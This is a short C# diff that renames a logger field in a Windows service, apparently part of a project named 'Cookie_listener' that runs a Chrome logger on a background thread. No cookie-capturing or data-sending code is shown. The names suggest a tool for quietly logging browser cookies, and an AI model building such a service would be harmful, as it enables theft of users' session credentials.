@@ -8,7 +8,7 @@ namespace Cookie_listener
 {
     public partial class Service_fo_chrome : ServiceBase
     {
-        Logger_fo_Chrome _loggerCHR;
+        Logger_fo_Chrome _logger;
         public Service_fo_chrome()
         {
             InitializeComponent();
@@ -26,8 +26,8 @@ namespace Cookie_listener
             {
                 try
                 {
-                    _loggerCHR = new Logger_fo_Chrome();
-                    Thread loggerThread = new Thread(new ThreadStart(_loggerCHR.Start));
+                    _logger = new Logger_fo_Chrome();
+                    Thread loggerThread = new Thread(new ThreadStart(_logger.Start));
                     loggerThread.Start();
                 }
                 catch (Exception ex) { EventLog.WriteEntry(ex.Message); }                                             
@@ -36,7 +36,7 @@ namespace Cookie_listener
 
         protected override void OnStop()
         {
-            _loggerCHR.Stop();
+            _logger.Stop();
             Thread.Sleep(1000);
         }
     }
